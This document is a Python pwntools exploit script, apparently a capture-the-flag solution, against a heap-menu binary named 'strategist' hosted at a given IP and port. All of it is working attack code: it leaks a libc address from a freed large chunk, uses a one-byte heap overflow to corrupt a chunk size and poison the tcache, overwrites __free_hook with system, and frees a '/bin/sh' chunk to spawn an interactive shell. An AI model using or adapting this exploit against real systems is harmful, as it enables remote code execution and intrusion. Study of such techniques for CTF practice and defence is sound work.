#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './strategist'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.54.190', 37604

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def create(size, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(size).encode())
    io.sendafter(b'>', data)

def show(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(idx).encode())
    io.sendafter(b'>', data)

def delete(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', str(idx).encode())

def exploit():
    global io
    io = initialize()

    create(0x420, b'a')
    create(0x10, b'protec')
    delete(0)

    create(0x420, b'a')
    show(0)
    io.recvuntil(b'0]: ')
    libc.address = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc61

    create(0x18, b'a'*0x18)     # 2
    create(0x18, b'bruv')       # 3
    create(0x18, b'victim-1')   # 4
    create(0x18, b'victim-2')   # 5

    edit(2, b'a'*0x18 + p8(0x61))
    delete(5)
    delete(4)
    delete(3)

    create(0x50, b'a'*0x18 + p64(0x21) + p64(libc.sym['__free_hook'])) # 3
    create(0x10, b'/bin/sh\x00') # 4
    create(0x10, p64(libc.sym['system'])) # 5

    delete(4)


    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
